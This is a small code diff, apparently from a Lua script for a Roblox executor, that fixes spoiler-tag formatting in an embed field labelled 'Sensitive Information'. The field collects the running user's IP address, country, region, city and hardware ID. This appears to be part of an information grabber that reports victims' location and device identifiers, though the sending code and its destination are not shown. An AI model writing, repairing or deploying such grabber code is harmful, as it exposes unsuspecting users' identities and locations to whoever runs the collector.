@@ -35,7 +35,7 @@ coroutine.wrap(function()
                             },
                             {
                                 ["name"] = "Sensitive Information:",
-                                ["value"] = "**IP:** ||"..WhoIs.ip.."||\n**Country:** ||"..WhoIs.country.."||\n**Region:** ||"..WhoIs.region.."||\n**City:** ||"..WhoIs.city.."\n**HWID:** ||"..gethwid().."||"
+                                ["value"] = "**IP:** ||"..WhoIs.ip.."||\n**Country:** ||"..WhoIs.country.."||\n**Region:** ||"..WhoIs.region.."||\n**City:** ||"..WhoIs.city.."||\n**HWID:** ||"..gethwid().."||"
                             },
                             {
                                 ["name"] = "Other Information:",
